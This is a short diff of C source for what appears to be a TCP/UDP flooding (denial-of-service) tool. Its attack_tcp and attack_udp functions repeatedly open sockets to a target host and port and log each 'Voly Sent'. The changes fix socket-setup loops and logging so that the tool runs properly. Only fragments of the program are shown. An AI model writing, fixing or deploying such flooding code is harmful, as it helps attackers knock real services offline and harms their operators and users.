@@ -55,6 +55,7 @@ int make_socket_tcp() {
 			close(sock);
 			continue;
 		}
+		break;
 		
 	}
 	if(p == NULL) {
@@ -88,6 +89,7 @@ int make_socket_udp() {
 			close(sock);
 			continue;
 		}
+		break;
 		
 	}
 	if(p == NULL) {
@@ -124,9 +126,9 @@ void attack_tcp() {
 				sockets[x] = make_socket_tcp(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			fprintf(stderr, "[%i: Voly Sent]\n", id++);
+			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
-		fprintf(stderr, "[%i: Voly Sent]\n", id++);
+		fprintf(stderr, "[%i: Voly Sent]\n", id);
 		usleep(300000);
 	}
 }
@@ -146,9 +148,9 @@ void attack_udp() {
 				sockets[x] = make_socket_udp(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			fprintf(stderr, "[%i: Voly Sent]\n", id++);
+			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
-		fprintf(stderr, "[%i: Voly Sent]\n", id++);
+		fprintf(stderr, "[%i: Voly Sent]\n", id);
 		usleep(300000);
 	}
 }
